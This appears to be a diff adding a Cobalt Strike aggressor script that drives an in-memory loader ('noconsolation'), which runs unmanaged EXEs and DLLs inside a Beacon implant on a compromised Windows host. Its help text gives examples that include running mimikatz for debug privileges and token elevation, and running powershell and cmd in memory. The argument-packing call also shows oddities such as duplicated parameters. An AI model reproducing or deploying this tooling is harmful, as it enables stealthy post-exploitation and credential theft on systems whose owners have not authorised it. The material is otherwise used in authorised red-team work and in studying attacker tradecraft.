@@ -1,0 +1,369 @@
+
+alias noconsolation
+{
+    local('$bid $barch $PE $args $path $path_set $name_set $pebytes $x $matchfound $pe_id $local $cmdline $headers $method $use_unicode $timeout $timeout_set $nooutput $alloc_console $close_handles $free_libs $dont_save $list_pes $unload_pe $link_to_peb $dont_unload $load_all_deps $load_all_deps_but $load_deps $search_paths $pepath $pename $inthread');
+
+    $bid = $1;
+    $pe_id = 0;
+    $local = 0;
+    $i = 1;
+    $path = '';
+    $pename = '';
+    $pepath = '';
+    $path_set = 0;
+    $name_set = 0;
+    $pebytes = '';
+    $headers = 0;
+    $method = '';
+    $use_unicode = 0;
+    $timeout = 60;
+    $timeout_set = 0;
+    $nooutput = 0;
+    $alloc_console = 0;
+    $close_handles = 0;
+    $free_libs = '';
+    $dont_save = 0;
+    $list_pes = 0;
+    $unload_pe = '';
+    $link_to_peb = 0;
+    $dont_unload = 0;
+    $load_all_deps = 0;
+    $load_all_deps_but = '';
+    $load_deps = '';
+    $search_paths = '';
+    $inthread = 0;
+
+    # make sure the beacon is not WoW64
+    $is64 = binfo($bid, "is64");
+    if($barch eq "x86" && $is64 == 1)
+    {
+        berror($1, "WoW64 is not supported");
+        return;
+    }
+
+    if(size(@_) < 2)
+    {
+        berror($bid, "Invalid number of arguments");
+        berror($bid, beacon_command_detail("noconsolation"));
+        return;
+    }
+
+    for ($i = 1; $i < size(@_); $i++)
+    {
+        if (@_[$i] eq "--local" || @_[$i] eq "-l")
+        {
+            $local = 1;
+        }
+        else if (@_[$i] eq "--timeout" || @_[$i] eq "-t")
+        {
+            $i++;
+
+            if($i >= size(@_))
+            {
+                berror($1, "missing --timeout value");
+                return;
+            }
+
+            $timeout = @_[$i];
+            if(!-isnumber $timeout)
+            {
+                berror($1, "Invalid timeout: " . $timeout);
+                return;
+            }
+            $timeout_set = 1;
+        }
+        else if (@_[$i] eq "-k")
+        {
+            $headers = 1;
+        }
+        else if (@_[$i] eq "--method" || @_[$i] eq "-m")
+        {
+            $i++;
+
+            if($i >= size(@_))
+            {
+                berror($1, "missing --method value");
+                return;
+            }
+
+            $method = @_[$i];
+        }
+        else if (@_[$i] eq "-w")
+        {
+            $use_unicode = 1;
+        }
+        else if (@_[$i] eq "--no-output" || @_[$i] eq "-no")
+        {
+            $nooutput = 1;
+        }
+        else if (@_[$i] eq "--alloc-console" || @_[$i] eq "-ac")
+        {
+            $alloc_console = 1;
+        }
+        else if (@_[$i] eq "--close-handles" || @_[$i] eq "-ch")
+        {
+            $close_handles = 1;
+        }
+        else if (@_[$i] eq "--free-libraries" || @_[$i] eq "-fl")
+        {
+            $i++;
+
+            if($i >= size(@_))
+            {
+                berror($1, "missing --free-libraries value");
+                return;
+            }
+
+            $free_libs = @_[$i];
+        }
+        else if (@_[$i] eq "--dont-save" || @_[$i] eq "-ds")
+        {
+            $dont_save = 1;
+        }
+        else if (@_[$i] eq "--list-pes" || @_[$i] eq "-lpe")
+        {
+            $list_pes = 1;
+        }
+        else if (@_[$i] eq "--unload-pe" || @_[$i] eq "-upe")
+        {
+            $i++;
+
+            if($i >= size(@_))
+            {
+                berror($1, "missing --unload-pe value");
+                return;
+            }
+
+            $unload_pe = @_[$i];
+        }
+        else if (@_[$i] eq "--link-to-peb" || @_[$i] eq "-ltp")
+        {
+            $link_to_peb = 1;
+        }
+        else if (@_[$i] eq "--dont-unload" || @_[$i] eq "-du")
+        {
+            $dont_unload = 1;
+        }
+        else if (@_[$i] eq "--load-all-dependencies" || @_[$i] eq "-lad")
+        {
+            $load_all_deps = 1;
+        }
+        else if (@_[$i] eq "--load-all-dependencies-but" || @_[$i] eq "-ladb")
+        {
+            $i++;
+
+            if($i >= size(@_))
+            {
+                berror($1, "missing --load-all-dependencies-but value");
+                return;
+            }
+
+            $load_all_deps_but = @_[$i];
+        }
+        else if (@_[$i] eq "--load-dependencies" || @_[$i] eq "-ld")
+        {
+            $i++;
+
+            if($i >= size(@_))
+            {
+                berror($1, "missing --load-dependencies value");
+                return;
+            }
+
+            $load_deps = @_[$i];
+        }
+        else if (@_[$i] eq "--search-paths" || @_[$i] eq "-sp")
+        {
+            $i++;
+
+            if($i >= size(@_))
+            {
+                berror($1, "missing --search-paths value");
+                return;
+            }
+
+            $search_paths = @_[$i];
+        }
+        else if (@_[$i] eq "--inthread" || @_[$i] eq "-it")
+        {
+            $inthread = 1;
+        }
+        else if (-exists @_[$i] || @_[$i] ismatch '^\p{Alpha}:\\\\.*')
+        {
+            $path_set = 1;
+            $path = @_[$i];
+            break;
+        }
+        else if ($local == 0 && !-exists @_[$i] && @_[$i] ismatch '^/\p{Alpha}.*')
+        {
+            berror($bid, "Specified executable ". @_[$i] ." does not exist");
+            return;
+        }
+        else if ($local == 0 && @_[$i] ismatch '^\p{Alpha}.*\.exe')
+        {
+            $name_set = 1;
+            $pename = @_[$i];
+            break;
+        }
+        else if (@_[$i] eq "--help" || @_[$i] eq "-h")
+        {
+            berror($1, beacon_command_detail("noconsolation"));
+            return;
+        }
+        else
+        {
+            berror($1, "invalid argument: " . @_[$i]);
+            return;
+        }
+    }
+
+    # allow users to perform some tasks without having to run a PE
+    if (strlen($free_libs) == 0 && strlen($unload_pe) == 0 && $list_pes == 0 && $name_set == 0 && $path_set == 0 && $close_handles == 0)
+    {
+        berror($1, "PE path not provided");
+        return;
+    }
+
+    if ($path_set && !-exists $path && $local == 0)
+    {
+        berror($bid, "Specified executable ". $path ." does not exist");
+        return;
+    }
+
+    if ($path_set && $list_pes)
+    {
+        berror($bid, "The option --list-pes must be ran alone");
+        return;
+    }
+
+    if (strlen($unload_pe) != 0 && $list_pes)
+    {
+        berror($bid, "The option --list-pes must be ran alone");
+        return;
+    }
+
+    if (strlen($free_libs) != 0 && $list_pes)
+    {
+        berror($bid, "The option --list-pes must be ran alone");
+        return;
+    }
+
+    if (strlen($free_libs) != 0 && strlen($unload_pe) != 0)
+    {
+        berror($bid, "The option --unload-pe must be ran alone");
+        return;
+    }
+
+    if ($path_set && strlen($unload_pe) != 0)
+    {
+        berror($bid, "The option --unload-pe must be ran alone");
+        return;
+    }
+
+    if ($path_set && strlen($free_libs) != 0)
+    {
+        berror($bid, "The option --free-libraries must be ran alone");
+        return;
+    }
+
+    if ($timeout_set && $inthread)
+    {
+        berror($bid, "The options --inthread and --timeout are not compatible");
+        return;
+    }
+
+    if ($path_set)
+    {
+        if ($local == 0)
+        {
+            $pename = split("/", $path, 50)[-1];
+            $pepath = "C:\\Windows\\System32\\" . $pename;
+
+            $handle = openf($path);
+            $pebytes = readb($handle, -1);
+            closef($handle);
+            if(strlen($pebytes) == 0)
+            {
+                berror($1, "could not read PE");
+                return;
+            }
+            $path = '';
+        }
+        else
+        {
+            $pename = split('\\\\', $path, 50)[-1];
+            $pepath = $path;
+        }
+    }
+
+    if ($path_set || $name_set)
+    {
+        # Iterate through args given
+        $cmdline = $pename;
+        for ($y = $i + 1; $y < size(@_); $y++)
+        {
+            # We have instructed users to 'escape' double quotes by using a backslash
+            # identify this and replace with a normal double quote.
+            $arg = strrep(@_[$y], '\\"', '"');
+            $cmdline = $cmdline .  " " . $arg;
+        }
+    }
+
+    runpe($bid, $pename, $pepath, $pebytes, $path, $local, $timeout, $headers, $cmdline, $method, $use_unicode, $nooutput, $alloc_console, $close_handles, $free_libs, $dont_save, $list_pes, $unload_pe, mynick(), tstamp(ticks()), $link_to_peb, $dont_unload, $load_all_deps, $load_all_deps_but, $load_deps, $search_paths, $inthread);
+}
+
+sub runpe{
+    $barch = barch($1);
+    # read in the right BOF file
+    $handle = openf(script_resource("dist/NoConsolation. $+ $barch $+ .o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+    if(strlen($data) == 0)
+    {
+        berror($1, "could not read BOF");
+        return;
+    }
+
+    # Pack the arguments
+    $args = bof_pack($1, "ZzZbziiiZzziiiziiizzziiizzzi", $2 $2, $3, $4, $5, $6, $7, $8, $9, $9, $10, $11, $12, $13, $14, $15, $16, $17, $18, $19, $20, $21, $22, $23, $24, $25, $26, $27);
+
+    # Execute BOF
+    beacon_inline_execute($1, $data, "go", $args);
+}
+
+beacon_command_register(
+    "noconsolation",
+    "Run an unmanaged EXE/DLL inside Beacon's memory",
+    "
+Summary: Run an unmanaged EXE/DLL inside Beacon's memory.
+
+Usage: noconsolation [--local] [--inthread] [--link-to-peb] [--dont-unload] [--timeout 60] [-k] [--method funcname] [-w] [--no-output] [--alloc-console] [--close-handles] [--free-libraries wininet.dll,winhttp.dll] [--dont-save] [--list-pes] [--unload-pe pename] [--load-all-dependencies] [--load-all-dependencies-but advapi32.dll] [--load-dependencies wininet.dll] [--search-paths C:\\Windows\\Temp\\] /path/to/binary.exe arg1 arg2
+    --local, -l                                    Optional. The binary should be loaded from the target Windows machine
+    --inthread, -it                                Optional. Run the PE with the main thread. This might hang your beacon depending on the PE and its arguments.
+    --link-to-peb, -ltp                            Optional. Load the PE into the PEB
+    --dont-unload, -du                             Optional. If set, the DLL won't be unloaded.
+    --timeout NUM_SECONDS, -t NUM_SECONDS          Optional. The number of seconds you wish to wait for the PE to complete running. Default 60 seconds. Set to 0 to disable
+    -k                                             Optional. Overwrite the PE headers
+    --method EXPORT_NAME, -m EXPORT_NAME           Optional. Method or function name to execute in case of DLL. If not provided, DllMain will be executed
+    -w                                             Optional. Command line is passed to unmanaged DLL function in UNICODE format. (default is ANSI)
+    --no-output, -no                               Optional. Do not try to obtain the output
+    --alloc-console, -ac                           Optional. Allocate a console. This will spawn a new process
+    --close-handles, -ch                           Optional. Close Pipe handles once finished. If PowerShell was already ran, this will break the output for PowerShell in the future
+    --free-libraries, -fl DLL_A,DLL_B              Optional. List of DLLs (previously loaded with --dont-unload) to be offloaded
+    --dont-save, -ds                               Optional. Do not save this binary in memory
+    --list-pes, -lpe                               Optional. List all PEs that have been loaded in memory
+    --unload-pe PE_NAME, -upe PE_NAME              Optional. Unload from memory a PE
+    --load-all-dependencies, -lad                  Optional. Custom load all the PE's dependencies
+    --load-all-dependencies-but, -ladb DLL_A,DLL_B Optional. Custom load all the PE's dependencies except these
+    --load-dependencies, -ld DLL_A,DLL_B           Optional. Custom load these PE's dependencies
+    --search-paths, -sp PATH_A,PATH_B              Optional. Look for DLLs on these paths (system32 is the default)
+
+    /path/to/binary.exe                   Required. Full path to the windows EXE/DLL you wish you run inside Beacon. If already loaded, you can simply specify the binary name.
+    ARG1 ARG2                             Optional. Parameters for the PE. Must be provided after the path
+
+    Example: noconsolation --local C:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe \$ExecutionContext.SessionState.LanguageMode
+    Example: noconsolation /tmp/mimikatz.exe privilege::debug token::elevate exit
+    Example: noconsolation --local C:\\windows\\system32\\cmd.exe /c ipconfig
+    Example: noconsolation --list-pes
+    Example: noconsolation LoadedBinary.exe args
+");
